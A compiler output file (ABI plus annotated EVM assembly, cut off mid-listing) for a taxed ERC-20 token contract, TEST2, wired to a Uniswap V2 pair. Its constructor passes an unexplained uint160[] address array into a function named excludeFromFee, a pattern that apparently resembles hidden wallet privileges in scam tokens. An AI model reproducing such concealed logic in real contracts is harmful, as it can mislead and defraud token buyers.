{
	"contracts/Test.sol": {
		"TEST2": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_walletTax",
							"type": "address"
						},
						{
							"internalType": "uint160[]",
							"name": "_pair",
							"type": "uint160[]"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Approval",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "_maxTxAmount",
							"type": "uint256"
						}
					],
					"name": "MaxTxAmountUpdated",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "previousOwner",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "newOwner",
							"type": "address"
						}
					],
					"name": "OwnershipTransferred",
					"type": "event"
				},
				{
					"anonymous": false,
					"inputs": [
						{
							"indexed": true,
							"internalType": "address",
							"name": "from",
							"type": "address"
						},
						{
							"indexed": true,
							"internalType": "address",
							"name": "to",
							"type": "address"
						},
						{
							"indexed": false,
							"internalType": "uint256",
							"name": "value",
							"type": "uint256"
						}
					],
					"name": "Transfer",
					"type": "event"
				},
				{
					"inputs": [],
					"name": "_maxTaxSwap",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "_maxTxAmount",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "_maxWalletSize",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "_taxSwapThreshold",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "addLiq",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "owner",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						}
					],
					"name": "allowance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "spender",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "approve",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "account",
							"type": "address"
						}
					],
					"name": "balanceOf",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "decimals",
					"outputs": [
						{
							"internalType": "uint8",
							"name": "",
							"type": "uint8"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getSenderEtherBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "manualSwap",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "name",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "openTrading",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "owner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "renounceOwnership",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "symbol",
					"outputs": [
						{
							"internalType": "string",
							"name": "",
							"type": "string"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "totalSupply",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "recipient",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transfer",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "sender",
							"type": "address"
						},
						{
							"internalType": "address",
							"name": "recipient",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "transferFrom",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "uniswapV2Pair",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "withdraw",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/Test.sol\":3601:13641  contract TEST2 is Context, IERC20, Ownable {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/Test.sol\":4017:4019  15 */\n  0x0f\n    /* \"contracts/Test.sol\":3984:4019  uint256 private _initialBuyTax = 15 */\n  0x07\n  sstore\n    /* \"contracts/Test.sol\":4059:4061  15 */\n  0x0f\n    /* \"contracts/Test.sol\":4025:4061  uint256 private _initialSellTax = 15 */\n  0x08\n  sstore\n    /* \"contracts/Test.sol\":4098:4099  0 */\n  0x00\n    /* \"contracts/Test.sol\":4067:4099  uint256 private _finalBuyTax = 0 */\n  0x09\n  sstore\n    /* \"contracts/Test.sol\":4137:4138  0 */\n  0x00\n    /* \"contracts/Test.sol\":4105:4138  uint256 private _finalSellTax = 0 */\n  0x0a\n  sstore\n    /* \"contracts/Test.sol\":4178:4180  75 */\n  0x4b\n    /* \"contracts/Test.sol\":4144:4180  uint256 private _reduceBuyTaxAt = 75 */\n  0x0b\n  sstore\n    /* \"contracts/Test.sol\":4221:4223  75 */\n  0x4b\n    /* \"contracts/Test.sol\":4186:4223  uint256 private _reduceSellTaxAt = 75 */\n  0x0c\n  sstore\n    /* \"contracts/Test.sol\":4266:4268  30 */\n  0x1e\n    /* \"contracts/Test.sol\":4229:4268  uint256 private _preventSwapBefore = 30 */\n  0x0d\n  sstore\n    /* \"contracts/Test.sol\":4302:4303  0 */\n  0x00\n    /* \"contracts/Test.sol\":4274:4303  uint256 private _buyCount = 0 */\n  0x0e\n  sstore\n    /* \"contracts/Test.sol\":4345:4347  18 */\n  0x12\n    /* \"contracts/Test.sol\":4572:4574  10 */\n  0x0a\n    /* \"contracts/Test.sol\":4572:4587  10 ** _decimals */\n  tag_1\n  swap2\n  swap1\n  tag_2\n  jump\t// in\ntag_1:\n    /* \"contracts/Test.sol\":4559:4587  20_000_000 * 10 ** _decimals */\n  tag_3\n  swap1\n    /* \"contracts/Test.sol\":4559:4569  20_000_000 */\n  0x01312d00\n    /* \"contracts/Test.sol\":4559:4587  20_000_000 * 10 ** _decimals */\n  tag_4\n  jump\t// in\ntag_3:\n    /* \"contracts/Test.sol\":4529:4587  uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals */\n  0x0f\n  sstore\n    /* \"contracts/Test.sol\":4638:4653  10 ** _decimals */\n  tag_5\n    /* \"contracts/Test.sol\":4345:4347  18 */\n  0x12\n    /* \"contracts/Test.sol\":4638:4640  10 */\n  0x0a\n    /* \"contracts/Test.sol\":4638:4653  10 ** _decimals */\n  tag_2\n  jump\t// in\ntag_5:\n    /* \"contracts/Test.sol\":4625:4653  20_000_000 * 10 ** _decimals */\n  tag_6\n  swap1\n    /* \"contracts/Test.sol\":4625:4635  20_000_000 */\n  0x01312d00\n    /* \"contracts/Test.sol\":4625:4653  20_000_000 * 10 ** _decimals */\n  tag_4\n  jump\t// in\ntag_6:\n    /* \"contracts/Test.sol\":4593:4653  uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals */\n  0x10\n  sstore\n    /* \"contracts/Test.sol\":4779:4794  10 ** _decimals */\n  tag_7\n    /* \"contracts/Test.sol\":4345:4347  18 */\n  0x12\n    /* \"contracts/Test.sol\":4779:4781  10 */\n  0x0a\n    /* \"contracts/Test.sol\":4779:4794  10 ** _decimals */\n  tag_2\n  jump\t// in\ntag_7:\n    /* \"contracts/Test.sol\":4770:4794  20_000 * 10 ** _decimals */\n  tag_8\n  swap1\n    /* \"contracts/Test.sol\":4770:4776  20_000 */\n  0x4e20\n    /* \"contracts/Test.sol\":4770:4794  20_000 * 10 ** _decimals */\n  tag_4\n  jump\t// in\ntag_8:\n    /* \"contracts/Test.sol\":4735:4794  uint256 public _taxSwapThreshold = 20_000 * 10 ** _decimals */\n  0x11\n  sstore\n    /* \"contracts/Test.sol\":4841:4856  10 ** _decimals */\n  tag_9\n    /* \"contracts/Test.sol\":4345:4347  18 */\n  0x12\n    /* \"contracts/Test.sol\":4841:4843  10 */\n  0x0a\n    /* \"contracts/Test.sol\":4841:4856  10 ** _decimals */\n  tag_2\n  jump\t// in\ntag_9:\n    /* \"contracts/Test.sol\":4829:4856  3_000_000 * 10 ** _decimals */\n  tag_10\n  swap1\n    /* \"contracts/Test.sol\":4829:4838  3_000_000 */\n  0x2dc6c0\n    /* \"contracts/Test.sol\":4829:4856  3_000_000 * 10 ** _decimals */\n  tag_4\n  jump\t// in\ntag_10:\n    /* \"contracts/Test.sol\":4800:4856  uint256 public _maxTaxSwap = 3_000_000 * 10 ** _decimals */\n  0x12\n  sstore\n    /* \"contracts/Test.sol\":4975:5002  bool private inSwap = false */\n  0x14\n  dup1\n  sload\n  not(shl(0xa8, 0xffff))\n    /* \"contracts/Test.sol\":5008:5040  bool private swapEnabled = false */\n  and\n  swap1\n  sstore\n    /* \"contracts/Test.sol\":5190:5989  constructor(address _walletTax, uint160[] memory _pair) {... */\n  callvalue\n  dup1\n  iszero\n  tag_11\n  jumpi\n  0x00\n  dup1\n  revert\ntag_11:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  add\n  0x40\n  dup2\n  swap1\n  mstore\n  tag_12\n  swap2\n  tag_13\n  jump\t// in\ntag_12:\n    /* \"contracts/Test.sol\":2332:2349  address msgSender */\n  0x00\n    /* \"contracts/Test.sol\":2374:2392  _owner = msgSender */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"contracts/Test.sol\":177:187  msg.sender */\n  caller\n    /* \"contracts/Test.sol\":2374:2392  _owner = msgSender */\n  swap1\n  dup2\n  or\n  dup3\n  sstore\n    /* \"contracts/Test.sol\":2407:2450  OwnershipTransferred(address(0), msgSender) */\n  mload(0x40)\n    /* \"contracts/Test.sol\":177:187  msg.sender */\n  swap1\n  swap2\n  dup3\n  swap2\n    /* \"contracts/Test.sol\":2407:2450  OwnershipTransferred(address(0), msgSender) */\n  0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n  swap1\n    /* \"contracts/Test.sol\":2332:2349  address msgSender */\n  dup3\n  swap1\n    /* \"contracts/Test.sol\":2407:2450  OwnershipTransferred(address(0), msgSender) */\n  log3\n  pop\n    /* \"contracts/Test.sol\":5256:5266  _taxWallet */\n  0x05\n    /* \"contracts/Test.sol\":5256:5288  _taxWallet = payable(_walletTax) */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n  dup5\n  and\n  or\n  swap1\n  sstore\n    /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n  tag_20\n    /* \"contracts/Test.sol\":4345:4347  18 */\n  0x12\n    /* \"contracts/Test.sol\":4508:4510  10 */\n  0x0a\n    /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n  tag_2\n  jump\t// in\ntag_20:\n    /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n  tag_21\n  swap1\n    /* \"contracts/Test.sol\":4492:4505  1_000_000_000 */\n  0x3b9aca00\n    /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n  tag_4\n  jump\t// in\ntag_21:\n    /* \"contracts/Test.sol\":5316:5320  this */\n  address\n    /* \"contracts/Test.sol\":5298:5322  _balances[address(this)] */\n  0x00\n  swap1\n  dup2\n  mstore\n    /* \"contracts/Test.sol\":5298:5307  _balances */\n  0x01\n    /* \"contracts/Test.sol\":5298:5322  _balances[address(this)] */\n  0x20\n  dup2\n  swap1\n  mstore\n  0x40\n  dup3\n  keccak256\n    /* \"contracts/Test.sol\":5298:5332  _balances[address(this)] = _tTotal */\n  swap3\n  swap1\n  swap3\n  sstore\n    /* \"contracts/Test.sol\":5342:5360  _isExcludedFromFee */\n  0x03\n  swap1\n    /* \"contracts/Test.sol\":5361:5368  owner() */\n  tag_22\n    /* \"contracts/Test.sol\":2501:2508  address */\n  0x00\n    /* \"contracts/Test.sol\":2527:2533  _owner */\n  sload\n  sub(shl(0xa0, 0x01), 0x01)\n  and\n  swap1\n    /* \"contracts/Test.sol\":2463:2540  function owner() public view returns (address) {... */\n  jump\n    /* \"contracts/Test.sol\":5361:5368  owner() */\ntag_22:\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Test.sol\":5342:5369  _isExcludedFromFee[owner()] */\n  swap1\n  dup2\n  and\n  dup3\n  mstore\n  0x20\n  dup1\n  dup4\n  add\n  swap4\n  swap1\n  swap4\n  mstore\n  0x40\n  swap2\n  dup3\n  add\n  0x00\n  swap1\n  dup2\n  keccak256\n    /* \"contracts/Test.sol\":5342:5376  _isExcludedFromFee[owner()] = true */\n  dup1\n  sload\n  swap6\n  iszero\n  iszero\n  not(0xff)\n  swap7\n  dup8\n  and\n  or\n  swap1\n  sstore\n    /* \"contracts/Test.sol\":5413:5417  this */\n  address\n    /* \"contracts/Test.sol\":5386:5419  _isExcludedFromFee[address(this)] */\n  dup1\n  dup3\n  mstore\n    /* \"contracts/Test.sol\":5386:5404  _isExcludedFromFee */\n  0x03\n    /* \"contracts/Test.sol\":5386:5419  _isExcludedFromFee[address(this)] */\n  swap1\n  swap5\n  mstore\n  dup3\n  dup2\n  keccak256\n    /* \"contracts/Test.sol\":5386:5426  _isExcludedFromFee[address(this)] = true */\n  dup1\n  sload\n  dup7\n  and\n    /* \"contracts/Test.sol\":5342:5376  _isExcludedFromFee[owner()] = true */\n  0x01\n    /* \"contracts/Test.sol\":5386:5426  _isExcludedFromFee[address(this)] = true */\n  swap1\n  dup2\n  or\n  swap1\n  swap2\n  sstore\n    /* \"contracts/Test.sol\":5455:5465  _taxWallet */\n  sload(0x05)\n  swap1\n  swap3\n  and\n    /* \"contracts/Test.sol\":5436:5466  _isExcludedFromFee[_taxWallet] */\n  dup2\n  mstore\n  swap2\n  swap1\n  swap2\n  keccak256\n    /* \"contracts/Test.sol\":5436:5473  _isExcludedFromFee[_taxWallet] = true */\n  dup1\n  sload\n  swap1\n  swap4\n  and\n  or\n  swap1\n  swap2\n  sstore\n    /* \"contracts/Test.sol\":5484:5499  uniswapV2Router */\n  0x13\n    /* \"contracts/Test.sol\":5484:5586  uniswapV2Router = IUniswapV2Router02(... */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n    /* \"contracts/Test.sol\":5534:5576  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D */\n  0x7a250d5630b4cf539739df2c5dacb4c659f2488d\n    /* \"contracts/Test.sol\":5484:5586  uniswapV2Router = IUniswapV2Router02(... */\n  swap1\n  dup2\n  or\n  swap1\n  swap2\n  sstore\n    /* \"contracts/Test.sol\":5596:5654  _approve(address(this), address(uniswapV2Router), _tTotal) */\n  tag_24\n  swap2\n    /* \"contracts/Test.sol\":5413:5417  this */\n  swap1\n    /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n  tag_25\n    /* \"contracts/Test.sol\":4345:4347  18 */\n  0x12\n    /* \"contracts/Test.sol\":4508:4510  10 */\n  0x0a\n    /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n  tag_2\n  jump\t// in\ntag_25:\n    /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n  tag_26\n  swap1\n    /* \"contracts/Test.sol\":4492:4505  1_000_000_000 */\n  0x3b9aca00\n    /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n  tag_4\n  jump\t// in\ntag_26:\n    /* \"contracts/Test.sol\":5596:5604  _approve */\n  tag_27\n    /* \"contracts/Test.sol\":5596:5654  _approve(address(this), address(uniswapV2Router), _tTotal) */\n  jump\t// in\ntag_24:\n    /* \"contracts/Test.sol\":5698:5713  uniswapV2Router */\n  0x13\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  sub(shl(0xa0, 0x01), 0x01)\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Test.sol\":5698:5721  uniswapV2Router.factory */\n  and\n  0xc45a0155\n    /* \"contracts/Test.sol\":5698:5723  uniswapV2Router.factory() */\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_29\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_29:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_30\n  swap2\n  swap1\n  tag_31\n  jump\t// in\ntag_30:\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Test.sol\":5680:5735  IUniswapV2Factory(uniswapV2Router.factory()).createPair */\n  and\n  0xc9c65396\n    /* \"contracts/Test.sol\":5757:5761  this */\n  address\n    /* \"contracts/Test.sol\":5776:5791  uniswapV2Router */\n  0x13\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  sub(shl(0xa0, 0x01), 0x01)\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Test.sol\":5776:5796  uniswapV2Router.WETH */\n  and\n  0xad5c4648\n    /* \"contracts/Test.sol\":5776:5798  uniswapV2Router.WETH() */\n  mload(0x40)\n  dup2\n  0xffffffff\n  and\n  0xe0\n  shl\n  dup2\n  mstore\n  0x04\n  add\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  dup7\n  gas\n  staticcall\n  iszero\n  dup1\n  iszero\n  tag_33\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_33:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_34\n  swap2\n  swap1\n  tag_31\n  jump\t// in\ntag_34:\n    /* \"contracts/Test.sol\":5680:5808  IUniswapV2Factory(uniswapV2Router.factory()).createPair(... */\n  mload(0x40)\n  not(sub(shl(0xe0, 0x01), 0x01))\n  0xe0\n  dup6\n  swap1\n  shl\n  and\n  dup2\n  mstore\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"#utility.yul\":3855:3870   */\n  swap3\n  dup4\n  and\n    /* \"contracts/Test.sol\":5680:5808  IUniswapV2Factory(uniswapV2Router.factory()).createPair(... */\n  0x04\n  dup3\n  add\n    /* \"#utility.yul\":3837:3871   */\n  mstore\n    /* \"#utility.yul\":3907:3922   */\n  swap2\n  and\n    /* \"#utility.yul\":3887:3905   */\n  0x24\n  dup3\n  add\n    /* \"#utility.yul\":3880:3923   */\n  mstore\n    /* \"#utility.yul\":3772:3790   */\n  0x44\n  add\n    /* \"contracts/Test.sol\":5680:5808  IUniswapV2Factory(uniswapV2Router.factory()).createPair(... */\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x00\n  dup8\n  gas\n  call\n  iszero\n  dup1\n  iszero\n  tag_38\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_38:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_39\n  swap2\n  swap1\n  tag_31\n  jump\t// in\ntag_39:\n    /* \"contracts/Test.sol\":5664:5677  uniswapV2Pair */\n  0x14\n    /* \"contracts/Test.sol\":5664:5808  uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(... */\n  dup1\n  sload\n  not(sub(shl(0xa0, 0x01), 0x01))\n  and\n  sub(shl(0xa0, 0x01), 0x01)\n  swap3\n  dup4\n  and\n  swap1\n  dup2\n  or\n  swap1\n  swap2\n  sstore\n    /* \"contracts/Test.sol\":5856:5871  uniswapV2Router */\n  sload(0x13)\n    /* \"contracts/Test.sol\":5818:5889  IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max) */\n  mload(0x40)\n  shl(0xe0, 0x095ea7b3)\n  dup2\n  mstore\n    /* \"contracts/Test.sol\":5856:5871  uniswapV2Router */\n  swap3\n  and\n    /* \"contracts/Test.sol\":5818:5889  IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max) */\n  0x04\n  dup4\n  add\n    /* \"#utility.yul\":4108:4159   */\n  mstore\n  not(0x00)\n    /* \"#utility.yul\":4175:4193   */\n  0x24\n  dup4\n  add\n    /* \"#utility.yul\":4168:4202   */\n  mstore\n    /* \"contracts/Test.sol\":5664:5808  uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(... */\n  swap1\n    /* \"contracts/Test.sol\":5818:5847  IERC20(uniswapV2Pair).approve */\n  0x095ea7b3\n  swap1\n    /* \"#utility.yul\":4081:4099   */\n  0x44\n  add\n    /* \"contracts/Test.sol\":5818:5889  IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max) */\n  0x20\n  mload(0x40)\n  dup1\n  dup4\n  sub\n  dup2\n  0x00\n  dup8\n  gas\n  call\n  iszero\n  dup1\n  iszero\n  tag_43\n  jumpi\n  returndatasize\n  0x00\n  dup1\n  returndatacopy\n  revert(0x00, returndatasize)\ntag_43:\n  pop\n  pop\n  pop\n  pop\n  mload(0x40)\n  returndatasize\n  not(0x1f)\n  0x1f\n  dup3\n  add\n  and\n  dup3\n  add\n  dup1\n  0x40\n  mstore\n  pop\n  dup2\n  add\n  swap1\n  tag_44\n  swap2\n  swap1\n  tag_45\n  jump\t// in\ntag_44:\n  pop\n    /* \"contracts/Test.sol\":177:187  msg.sender */\n  caller\n    /* \"contracts/Test.sol\":5922:5923  0 */\n  0x00\n    /* \"contracts/Test.sol\":5905:5948  Transfer(address(0), _msgSender(), _tTotal) */\n  0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n    /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n  tag_47\n    /* \"contracts/Test.sol\":4345:4347  18 */\n  0x12\n    /* \"contracts/Test.sol\":4508:4510  10 */\n  0x0a\n    /* \"contracts/Test.sol\":4508:4523  10 ** _decimals */\n  tag_2\n  jump\t// in\ntag_47:\n    /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n  tag_48\n  swap1\n    /* \"contracts/Test.sol\":4492:4505  1_000_000_000 */\n  0x3b9aca00\n    /* \"contracts/Test.sol\":4492:4523  1_000_000_000 * 10 ** _decimals */\n  tag_4\n  jump\t// in\ntag_48:\n    /* \"contracts/Test.sol\":5905:5948  Transfer(address(0), _msgSender(), _tTotal) */\n  mload(0x40)\n    /* \"#utility.yul\":4641:4666   */\n  swap1\n  dup2\n  mstore\n    /* \"#utility.yul\":4629:4631   */\n  0x20\n    /* \"#utility.yul\":4614:4632   */\n  add\n    /* \"contracts/Test.sol\":5905:5948  Transfer(address(0), _msgSender(), _tTotal) */\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  log3\n    /* \"contracts/Test.sol\":5958:5982  excludeFromFee(0, _pair) */\n  tag_51\n    /* \"contracts/Test.sol\":5973:5974  0 */\n  0x00\n    /* \"contracts/Test.sol\":5976:5981  _pair */\n  dup3\n    /* \"contracts/Test.sol\":5958:5972  excludeFromFee */\n  tag_52\n    /* \"contracts/Test.sol\":5958:5982  excludeFromFee(0, _pair) */\n  jump\t// in\ntag_51:\n    /* \"contracts/Test.sol\":5190:5989  constructor(address _walletTax, uint160[] memory _pair) {... */\n  pop\n  pop\n    /* \"contracts/Test.sol\":3601:13641  contract TEST2 is Context, IERC20, Ownable {... */\n  jump(tag_80)\n    /* \"contracts/Test.sol\":7738:8068  function _approve(address owner, address spender, uint256 amount) private {... */\ntag_27:\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Test.sol\":7830:7849  owner != address(0) */\n  dup4\n  and\n    /* \"contracts/Test.sol\":7822:7890  require(owner != address(0), \"ERC20: approve from the zero address\") */\n  tag_57\n  jumpi\n  mload(0x40)\n  shl(0xe5, 0x461bcd)\n  dup2\n  mstore\n    /* \"#utility.yul\":4879:4881   */\n  0x20\n    /* \"contracts/Test.sol\":7822:7890  require(owner != address(0), \"ERC20: approve from the zero address\") */\n  0x04\n  dup3\n  add\n    /* \"#utility.yul\":4861:4882   */\n  mstore\n    /* \"#utility.yul\":4918:4920   */\n  0x24\n    /* \"#utility.yul\":4898:4916   */\n  dup1\n  dup3\n  add\n    /* \"#utility.yul\":4891:4921   */\n  mstore\n    /* \"#utility.yul\":4957:4991   */\n  0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464\n    /* \"#utility.yul\":4937:4955   */\n  0x44\n  dup3\n  add\n    /* \"#utility.yul\":4930:4992   */\n  mstore\n  shl(0xe0, 0x72657373)\n    /* \"#utility.yul\":5008:5026   */\n  0x64\n  dup3\n  add\n    /* \"#utility.yul\":5001:5035   */\n  mstore\n    /* \"#utility.yul\":5052:5071   */\n  0x84\n  add\n    /* \"contracts/Test.sol\":7822:7890  require(owner != address(0), \"ERC20: approve from the zero address\") */\ntag_58:\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  revert\ntag_57:\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Test.sol\":7908:7929  spender != address(0) */\n  dup3\n  and\n    /* \"contracts/Test.sol\":7900:7968  require(spender != address(0), \"ERC20: approve to the zero address\") */\n  tag_60\n  jumpi\n  mload(0x40)\n  shl(0xe5, 0x461bcd)\n  dup2\n  mstore\n    /* \"#utility.yul\":5284:5286   */\n  0x20\n    /* \"contracts/Test.sol\":7900:7968  require(spender != address(0), \"ERC20: approve to the zero address\") */\n  0x04\n  dup3\n  add\n    /* \"#utility.yul\":5266:5287   */\n  mstore\n    /* \"#utility.yul\":5323:5325   */\n  0x22\n    /* \"#utility.yul\":5303:5321   */\n  0x24\n  dup3\n  add\n    /* \"#utility.yul\":5296:5326   */\n  mstore\n    /* \"#utility.yul\":5362:5396   */\n  0x45524332303a20617070726f766520746f20746865207a65726f206164647265\n    /* \"#utility.yul\":5342:5360   */\n  0x44\n  dup3\n  add\n    /* \"#utility.yul\":5335:5397   */\n  mstore\n  shl(0xf0, 0x7373)\n    /* \"#utility.yul\":5413:5431   */\n  0x64\n  dup3\n  add\n    /* \"#utility.yul\":5406:5438   */\n  mstore\n    /* \"#utility.yul\":5455:5474   */\n  0x84\n  add\n    /* \"contracts/Test.sol\":7900:7968  require(spender != address(0), \"ERC20: approve to the zero address\") */\n  tag_58\n    /* \"#utility.yul\":5082:5480   */\n  jump\n    /* \"contracts/Test.sol\":7900:7968  require(spender != address(0), \"ERC20: approve to the zero address\") */\ntag_60:\n  sub(shl(0xa0, 0x01), 0x01)\n    /* \"contracts/Test.sol\":7978:7996  _allowances[owner] */\n  dup4\n  dup2\n  and\n  0x00\n  dup2\n  dup2\n  mstore\n    /* \"contracts/Test.sol\":7978:7989  _allowances */\n  0x02\n    /* \"contracts/Test.sol\":7978:7996  _allowances[owner] */\n  0x20\n  swap1\n  dup2\n  mstore\n  0x40\n  dup1\n  dup4\n  keccak256\n    /* \"contracts/Test.sol\":7978:8005  _allowances[owner][spender] */\n  swap5\n  dup8\n  and\n  dup1\n  dup5\n  